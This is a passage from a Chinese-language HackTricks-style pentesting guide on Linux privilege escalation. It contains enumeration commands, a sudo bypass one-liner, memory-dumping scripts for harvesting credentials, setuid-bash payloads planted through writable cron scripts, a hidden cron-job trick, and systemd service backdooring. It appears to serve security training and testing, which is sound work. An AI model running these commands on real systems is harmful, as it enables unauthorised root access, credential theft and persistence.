<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Linux Privilege Escalation</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="linux-权限提升"><a class="header" href="#linux-权限提升">Linux 权限提升</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<h2 id="系统信息"><a class="header" href="#系统信息">系统信息</a></h2>
<h3 id="操作系统信息"><a class="header" href="#操作系统信息">操作系统信息</a></h3>
<p>让我们开始了解运行的操作系统</p>
<pre><code class="language-bash">(cat /proc/version || uname -a ) 2&gt;/dev/null
lsb_release -a 2&gt;/dev/null # old, not by default on many systems
cat /etc/os-release 2&gt;/dev/null # universal on modern systems
</code></pre>
<h3 id="path"><a class="header" href="#path">Path</a></h3>
<p>如果您<strong>在<code>PATH</code>变量中的任何文件夹上具有写入权限</strong>，您可能能够劫持某些库或二进制文件：</p>
<pre><code class="language-bash">echo $PATH
</code></pre>
<h3 id="env-info"><a class="header" href="#env-info">Env info</a></h3>
<p>环境变量中有有趣的信息、密码或API密钥吗？</p>
<pre><code class="language-bash">(env || set) 2&gt;/dev/null
</code></pre>
<h3 id="kernel-exploits"><a class="header" href="#kernel-exploits">Kernel exploits</a></h3>
<p>检查内核版本，看看是否有可以用来提升权限的漏洞</p>
<pre><code class="language-bash">cat /proc/version
uname -a
searchsploit "Linux Kernel"
</code></pre>
<p>您可以在这里找到一个好的易受攻击内核列表和一些已经<strong>编译的漏洞利用</strong>： <a href="https://github.com/lucyoa/kernel-exploits">https://github.com/lucyoa/kernel-exploits</a> 和 <a href="https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits">exploitdb sploits</a>。<br />
其他可以找到一些<strong>编译的漏洞利用</strong>的网站： <a href="https://github.com/bwbwbwbw/linux-exploit-binaries">https://github.com/bwbwbwbw/linux-exploit-binaries</a>， <a href="https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack">https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack</a></p>
<p>要从该网站提取所有易受攻击的内核版本，您可以执行：</p>
<pre><code class="language-bash">curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2&gt;/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "&lt;" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
</code></pre>
<p>可以帮助搜索内核漏洞的工具有：</p>
<p><a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester.sh</a><br />
<a href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester2.pl</a><br />
<a href="http://www.securitysift.com/download/linuxprivchecker.py">linuxprivchecker.py</a>（在受害者上执行，仅检查内核2.x的漏洞）</p>
<p>始终<strong>在Google中搜索内核版本</strong>，也许您的内核版本在某个内核漏洞中被写入，这样您就可以确定该漏洞是有效的。</p>
<h3 id="cve-2016-5195-dirtycow"><a class="header" href="#cve-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</a></h3>
<p>Linux特权提升 - Linux内核 &lt;= 3.19.0-73.8</p>
<pre><code class="language-bash"># make dirtycow stable
echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
</code></pre>
<h3 id="sudo-版本"><a class="header" href="#sudo-版本">Sudo 版本</a></h3>
<p>基于出现在以下内容中的易受攻击的 sudo 版本：</p>
<pre><code class="language-bash">searchsploit sudo
</code></pre>
<p>您可以使用此 grep 检查 sudo 版本是否存在漏洞。</p>
<pre><code class="language-bash">sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
</code></pre>
<h4 id="sudo--v128"><a class="header" href="#sudo--v128">sudo &lt; v1.28</a></h4>
<p>来自 @sickrov</p>
<pre><code>sudo -u#-1 /bin/bash
</code></pre>
<h3 id="dmesg-签名验证失败"><a class="header" href="#dmesg-签名验证失败">Dmesg 签名验证失败</a></h3>
<p>检查 <strong>HTB 的 smasher2 box</strong> 以获取此漏洞可能被利用的 <strong>示例</strong></p>
<pre><code class="language-bash">dmesg 2&gt;/dev/null | grep "signature"
</code></pre>
<h3 id="更多系统枚举"><a class="header" href="#更多系统枚举">更多系统枚举</a></h3>
<pre><code class="language-bash">date 2&gt;/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2&gt;/dev/null #Printers info
</code></pre>
<h2 id="列举可能的防御措施"><a class="header" href="#列举可能的防御措施">列举可能的防御措施</a></h2>
<h3 id="apparmor"><a class="header" href="#apparmor">AppArmor</a></h3>
<pre><code class="language-bash">if [ `which aa-status 2&gt;/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2&gt;/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2&gt;/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
</code></pre>
<h3 id="grsecurity"><a class="header" href="#grsecurity">Grsecurity</a></h3>
<pre><code class="language-bash">((uname -r | grep "\-grsec" &gt;/dev/null 2&gt;&amp;1 || grep "grsecurity" /etc/sysctl.conf &gt;/dev/null 2&gt;&amp;1) &amp;&amp; echo "Yes" || echo "Not found grsecurity")
</code></pre>
<h3 id="pax"><a class="header" href="#pax">PaX</a></h3>
<pre><code class="language-bash">(which paxctl-ng paxctl &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo "Yes" || echo "Not found PaX")
</code></pre>
<h3 id="execshield"><a class="header" href="#execshield">Execshield</a></h3>
<pre><code class="language-bash">(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
</code></pre>
<h3 id="selinux"><a class="header" href="#selinux">SElinux</a></h3>
<pre><code class="language-bash">(sestatus 2&gt;/dev/null || echo "Not found sestatus")
</code></pre>
<h3 id="aslr"><a class="header" href="#aslr">ASLR</a></h3>
<p>地址空间布局随机化</p>
<pre><code class="language-bash">cat /proc/sys/kernel/randomize_va_space 2&gt;/dev/null
#If 0, not enabled
</code></pre>
<h2 id="docker-breakout"><a class="header" href="#docker-breakout">Docker Breakout</a></h2>
<p>如果你在一个docker容器内，你可以尝试逃离它：</p>
<p>{% content-ref url="docker-security/" %}
<a href="docker-security/">docker-security</a>
{% endcontent-ref %}</p>
<h2 id="drives"><a class="header" href="#drives">Drives</a></h2>
<p>检查<strong>什么是挂载和未挂载的</strong>，在哪里以及为什么。如果有任何未挂载的，你可以尝试挂载它并检查私人信息。</p>
<pre><code class="language-bash">ls /dev 2&gt;/dev/null | grep -i "sd"
cat /etc/fstab 2&gt;/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2&gt;/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2&gt;/dev/null
</code></pre>
<h2 id="有用的软件"><a class="header" href="#有用的软件">有用的软件</a></h2>
<p>枚举有用的二进制文件</p>
<pre><code class="language-bash">which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2&gt;/dev/null
</code></pre>
<p>此外，检查是否<strong>安装了任何编译器</strong>。如果您需要使用某些内核漏洞，这很有用，因为建议在您将要使用它的机器上（或类似的机器上）编译它。</p>
<pre><code class="language-bash">(dpkg --list 2&gt;/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2&gt;/dev/null || yum list installed 'gcc*' 2&gt;/dev/null | grep gcc 2&gt;/dev/null; which gcc g++ 2&gt;/dev/null || locate -r "/gcc[0-9\.-]\+$" 2&gt;/dev/null | grep -v "/doc/")
</code></pre>
<h3 id="安装的易受攻击软件"><a class="header" href="#安装的易受攻击软件">安装的易受攻击软件</a></h3>
<p>检查<strong>已安装软件包和服务的版本</strong>。可能有一些旧的Nagios版本（例如）可以被利用来提升权限…<br />
建议手动检查更可疑的已安装软件的版本。</p>
<pre><code class="language-bash">dpkg -l #Debian
rpm -qa #Centos
</code></pre>
<p>如果您可以通过SSH访问机器，您还可以使用<strong>openVAS</strong>检查机器上安装的过时和易受攻击的软件。</p>
<p>{% hint style="info" %}
<em>请注意，这些命令将显示大量信息，其中大部分将是无用的，因此建议使用一些应用程序，如OpenVAS或类似工具，检查任何已安装的软件版本是否易受已知漏洞的攻击</em>
{% endhint %}</p>
<h2 id="进程"><a class="header" href="#进程">进程</a></h2>
<p>查看<strong>正在执行的进程</strong>，并检查是否有任何进程<strong>拥有超过应有的权限</strong>（例如，可能是由root执行的tomcat？）</p>
<pre><code class="language-bash">ps aux
ps -ef
top -n 1
</code></pre>
<p>始终检查可能正在运行的 <a href="electron-cef-chromium-debugger-abuse.html"><strong>electron/cef/chromium 调试器</strong>，您可以利用它来提升权限</a>。<strong>Linpeas</strong> 通过检查进程命令行中的 <code>--inspect</code> 参数来检测这些。<br />
还要<strong>检查您对进程二进制文件的权限</strong>，也许您可以覆盖某个文件。</p>
<h3 id="进程监控"><a class="header" href="#进程监控">进程监控</a></h3>
<p>您可以使用像 <a href="https://github.com/DominicBreuker/pspy"><strong>pspy</strong></a> 这样的工具来监控进程。这对于识别频繁执行的易受攻击的进程或在满足一组要求时非常有用。</p>
<h3 id="进程内存"><a class="header" href="#进程内存">进程内存</a></h3>
<p>某些服务器服务在<strong>内存中以明文保存凭据</strong>。<br />
通常，您需要<strong>root 权限</strong>才能读取属于其他用户的进程的内存，因此这通常在您已经是 root 并想要发现更多凭据时更有用。<br />
但是，请记住，<strong>作为普通用户，您可以读取您拥有的进程的内存</strong>。</p>
<p>{% hint style="warning" %}
请注意，如今大多数机器<strong>默认不允许 ptrace</strong>，这意味着您无法转储属于您无权限用户的其他进程。</p>
<p>文件 <em><strong>/proc/sys/kernel/yama/ptrace_scope</strong></em> 控制 ptrace 的可访问性：</p>
<ul>
<li><strong>kernel.yama.ptrace_scope = 0</strong>：所有进程都可以被调试，只要它们具有相同的 uid。这是 ptracing 工作的经典方式。</li>
<li><strong>kernel.yama.ptrace_scope = 1</strong>：只有父进程可以被调试。</li>
<li><strong>kernel.yama.ptrace_scope = 2</strong>：只有管理员可以使用 ptrace，因为它需要 CAP_SYS_PTRACE 能力。</li>
<li><strong>kernel.yama.ptrace_scope = 3</strong>：不允许使用 ptrace 跟踪任何进程。一旦设置，需要重启才能再次启用 ptracing。
{% endhint %}</li>
</ul>
<h4 id="gdb"><a class="header" href="#gdb">GDB</a></h4>
<p>如果您可以访问 FTP 服务的内存（例如），您可以获取堆并在其凭据中进行搜索。</p>
<pre><code class="language-bash">gdb -p &lt;FTP_PROCESS_PID&gt;
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp &lt;START_HEAD&gt; &lt;END_HEAD&gt;
(gdb) q
strings /tmp/mem_ftp #User and password
</code></pre>
<h4 id="gdb-脚本"><a class="header" href="#gdb-脚本">GDB 脚本</a></h4>
<p>{% code title="dump-memory.sh" %}</p>
<pre><code class="language-bash">#!/bin/bash
#./dump-memory.sh &lt;PID&gt;
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
</code></pre>
<p>{% endcode %}</p>
<h4 id="procpidmaps--procpidmem"><a class="header" href="#procpidmaps--procpidmem">/proc/$pid/maps &amp; /proc/$pid/mem</a></h4>
<p>对于给定的进程 ID，<strong>maps 显示该进程的虚拟地址空间内如何映射内存</strong>；它还显示了<strong>每个映射区域的权限</strong>。<strong>mem</strong> 伪文件<strong>暴露了进程的内存本身</strong>。通过<strong>maps</strong> 文件，我们知道哪些<strong>内存区域是可读的</strong>及其偏移量。我们使用这些信息<strong>在 mem 文件中查找并将所有可读区域转储到文件中</strong>。</p>
<pre><code class="language-bash">procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin &gt; $1.dump
rm $1*.bin
)
</code></pre>
<h4 id="devmem"><a class="header" href="#devmem">/dev/mem</a></h4>
<p><code>/dev/mem</code> 提供对系统 <strong>物理</strong> 内存的访问，而不是虚拟内存。内核的虚拟地址空间可以通过 /dev/kmem 访问。<br />
通常，<code>/dev/mem</code> 仅可被 <strong>root</strong> 和 <strong>kmem</strong> 组读取。</p>
<pre><code>strings /dev/mem -n10 | grep -i PASS
</code></pre>
<h3 id="procdump-for-linux"><a class="header" href="#procdump-for-linux">ProcDump for linux</a></h3>
<p>ProcDump 是 Sysinternals 工具套件中经典 ProcDump 工具的 Linux 版本。可以在 <a href="https://github.com/Sysinternals/ProcDump-for-Linux">https://github.com/Sysinternals/ProcDump-for-Linux</a> 获取。</p>
<pre><code>procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
</code></pre>
<h3 id="工具"><a class="header" href="#工具">工具</a></h3>
<p>要转储进程内存，您可以使用：</p>
<ul>
<li><a href="https://github.com/Sysinternals/ProcDump-for-Linux"><strong>https://github.com/Sysinternals/ProcDump-for-Linux</strong></a></li>
<li><a href="https://github.com/hajzer/bash-memory-dump"><strong>https://github.com/hajzer/bash-memory-dump</strong></a> (root) - _您可以手动删除root要求并转储由您拥有的进程</li>
<li>来自 <a href="https://www.delaat.net/rp/2016-2017/p97/report.pdf"><strong>https://www.delaat.net/rp/2016-2017/p97/report.pdf</strong></a> 的脚本 A.5 (需要root)</li>
</ul>
<h3 id="从进程内存中获取凭据"><a class="header" href="#从进程内存中获取凭据">从进程内存中获取凭据</a></h3>
<h4 id="手动示例"><a class="header" href="#手动示例">手动示例</a></h4>
<p>如果您发现身份验证进程正在运行：</p>
<pre><code class="language-bash">ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
</code></pre>
<p>您可以转储进程（请参阅之前的部分以找到转储进程内存的不同方法），并在内存中搜索凭据：</p>
<pre><code class="language-bash">./dump-memory.sh 2027
strings *.dump | grep -i password
</code></pre>
<h4 id="mimipenguin"><a class="header" href="#mimipenguin">mimipenguin</a></h4>
<p>该工具 <a href="https://github.com/huntergregal/mimipenguin"><strong>https://github.com/huntergregal/mimipenguin</strong></a> 将 <strong>从内存中窃取明文凭据</strong> 和一些 <strong>众所周知的文件</strong>。它需要 root 权限才能正常工作。</p>
<div class="table-wrapper"><table><thead><tr><th>特性</th><th>进程名称</th></tr></thead><tbody>
<tr><td>GDM 密码（Kali 桌面，Debian 桌面）</td><td>gdm-password</td></tr>
<tr><td>Gnome 密钥环（Ubuntu 桌面，ArchLinux 桌面）</td><td>gnome-keyring-daemon</td></tr>
<tr><td>LightDM（Ubuntu 桌面）</td><td>lightdm</td></tr>
<tr><td>VSFTPd（活动 FTP 连接）</td><td>vsftpd</td></tr>
<tr><td>Apache2（活动 HTTP 基本认证会话）</td><td>apache2</td></tr>
<tr><td>OpenSSH（活动 SSH 会话 - Sudo 使用）</td><td>sshd:</td></tr>
</tbody></table>
</div>
<h4 id="search-regexestruffleproc"><a class="header" href="#search-regexestruffleproc">Search Regexes/<a href="https://github.com/controlplaneio/truffleproc">truffleproc</a></a></h4>
<pre><code class="language-bash"># un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
</code></pre>
<h2 id="scheduledcron-jobs"><a class="header" href="#scheduledcron-jobs">Scheduled/Cron jobs</a></h2>
<p>检查是否有任何计划任务存在漏洞。也许你可以利用由 root 执行的脚本（通配符漏洞？可以修改 root 使用的文件？使用符号链接？在 root 使用的目录中创建特定文件？）。</p>
<pre><code class="language-bash">crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2&gt;/dev/null | grep -v "^#"
</code></pre>
<h3 id="cron-path"><a class="header" href="#cron-path">Cron path</a></h3>
<p>例如，在 <em>/etc/crontab</em> 中可以找到 PATH: <em>PATH=<strong>/home/user</strong>:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</em></p>
<p>(<em>注意用户 "user" 对 /home/user 具有写权限</em>)</p>
<p>如果在这个 crontab 中，root 用户尝试执行某个命令或脚本而不设置路径。例如: <em>* * * * root overwrite.sh</em><br />
然后，您可以通过使用以下命令获得 root shell:</p>
<pre><code class="language-bash">echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
</code></pre>
<h3 id="cron-使用带通配符的脚本通配符注入"><a class="header" href="#cron-使用带通配符的脚本通配符注入">Cron 使用带通配符的脚本（通配符注入）</a></h3>
<p>如果由 root 执行的脚本在命令中包含“<strong>*</strong>”，您可以利用这一点来制造意想不到的事情（如权限提升）。示例：</p>
<pre><code class="language-bash">rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
</code></pre>
<p><strong>如果通配符前面有一个路径，比如</strong> <em><strong>/some/path/*</strong></em> <strong>，那么它就不容易受到攻击（即使是</strong> <em><strong>./*</strong></em> <strong>也不行）。</strong></p>
<p>阅读以下页面以获取更多通配符利用技巧：</p>
<p>{% content-ref url="wildcards-spare-tricks.md" %}
<a href="wildcards-spare-tricks.html">wildcards-spare-tricks.md</a>
{% endcontent-ref %}</p>
<h3 id="cron-脚本覆盖和符号链接"><a class="header" href="#cron-脚本覆盖和符号链接">Cron 脚本覆盖和符号链接</a></h3>
<p>如果你 <strong>可以修改一个由 root 执行的 cron 脚本</strong>，你可以很容易地获得一个 shell：</p>
<pre><code class="language-bash">echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; &lt;/PATH/CRON/SCRIPT&gt;
#Wait until it is executed
/tmp/bash -p
</code></pre>
<p>如果由 root 执行的脚本使用一个 <strong>您拥有完全访问权限的目录</strong>，那么删除该文件夹并 <strong>创建一个指向另一个文件夹的符号链接</strong>，该文件夹提供由您控制的脚本，可能会很有用。</p>
<pre><code class="language-bash">ln -d -s &lt;/PATH/TO/POINT&gt; &lt;/PATH/CREATE/FOLDER&gt;
</code></pre>
<h3 id="frequent-cron-jobs"><a class="header" href="#frequent-cron-jobs">Frequent cron jobs</a></h3>
<p>您可以监控进程，以搜索每 1、2 或 5 分钟执行的进程。也许您可以利用这一点来提升权限。</p>
<p>例如，要<strong>每 0.1 秒监控 1 分钟</strong>，<strong>按执行次数较少的命令排序</strong>并删除执行次数最多的命令，您可以这样做：</p>
<pre><code class="language-bash">for i in $(seq 1 610); do ps -e --format cmd &gt;&gt; /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
</code></pre>
<p><strong>您还可以使用</strong> <a href="https://github.com/DominicBreuker/pspy/releases"><strong>pspy</strong></a> （这将监视并列出每个启动的进程）。</p>
<h3 id="隐形的-cron-作业"><a class="header" href="#隐形的-cron-作业">隐形的 cron 作业</a></h3>
<p>可以创建一个 cron 作业 <strong>在注释后添加回车符</strong>（没有换行符），并且 cron 作业将正常工作。示例（注意回车符）：</p>
<pre><code class="language-bash">#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
</code></pre>
<h2 id="服务"><a class="header" href="#服务">服务</a></h2>
<h3 id="可写的-service-文件"><a class="header" href="#可写的-service-文件">可写的 <em>.service</em> 文件</a></h3>
<p>检查您是否可以写任何 <code>.service</code> 文件，如果可以，您 <strong>可以修改它</strong> 以便在服务 <strong>启动</strong>、<strong>重启</strong>或 <strong>停止</strong> 时 <strong>执行</strong> 您的 <strong>后门</strong>（也许您需要等到机器重启）。<br />
例如，在 .service 文件中创建您的后门，使用 <strong><code>ExecStart=/tmp/script.sh</code></strong></p>
<h3 id="可写的服务二进制文件"><a class="header" href="#可写的服务二进制文件">可写的服务二进制文件</a></h3>
<p>请记住，如果您对服务执行的二进制文件具有 <strong>写权限</strong>，您可以将它们更改为后门，这样当服务重新执行时，后门将被执行。</p>
<h3 id="systemd-path---相对路径"><a class="header" href="#systemd-path---相对路径">systemd PATH - 相对路径</a></h3>
<p>您可以使用以下命令查看 <strong>systemd</strong> 使用的 PATH：</p>
<pre><code class="language-bash">systemctl show-environment
</code></pre>
<p>如果您发现您可以在路径的任何文件夹中<strong>写入</strong>，您可能能够<strong>提升权限</strong>。您需要搜索<strong>在服务配置</strong>文件中使用的<strong>相对路径</strong>，例如：</p>
<pre><code class="language-bash">ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
</code></pre>
<p>然后，在您可以写入的 systemd PATH 文件夹中创建一个 <strong>可执行文件</strong>，其 <strong>名称与相对路径二进制文件相同</strong>，当服务被要求执行脆弱操作（<strong>启动</strong>，<strong>停止</strong>，<strong>重新加载</strong>）时，您的 <strong>后门将被执行</strong>（普通用户通常无法启动/停止服务，但请检查您是否可以使用 <code>sudo -l</code>）。</p>
<p><strong>通过 <code>man systemd.service</code> 了解更多关于服务的信息。</strong></p>
<h2 id="定时器"><a class="header" href="#定时器"><strong>定时器</strong></a></h2>
<p><strong>定时器</strong> 是以 <code>**.timer**</code> 结尾的 systemd 单元文件，用于控制 <code>**.service**</code> 文件或事件。 <strong>定时器</strong> 可以作为 cron 的替代方案，因为它们内置支持日历时间事件和单调时间事件，并且可以异步运行。</p>
<p>您可以通过以下命令列出所有定时器：</p>
<pre><code class="language-bash">systemctl list-timers --all
</code></pre>
<h3 id="可写定时器"><a class="header" href="#可写定时器">可写定时器</a></h3>
<p>如果您可以修改定时器，则可以使其执行某些 systemd.unit 的实例（如 <code>.service</code> 或 <code>.target</code>）</p>
